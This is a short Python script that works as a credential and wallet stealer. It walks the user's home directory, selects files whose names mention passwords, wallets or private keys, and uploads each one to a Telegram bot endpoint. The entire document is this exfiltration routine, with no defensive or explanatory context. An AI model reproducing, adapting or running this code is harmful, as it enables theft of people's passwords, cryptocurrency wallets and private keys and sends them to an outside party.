import requests
keywords = ['password', 'wallet', 'private_key']
for root, dirs, files in os.walk(os.path.expanduser('~')):
  for file in files:
    if any(keyword in file for keyword in keywords):
      with open(os.path.join(root, file), 'rb') as fh:
        requests.post('https://api.telegram.org/bot<token>/sendDocument', files={'document': fh})
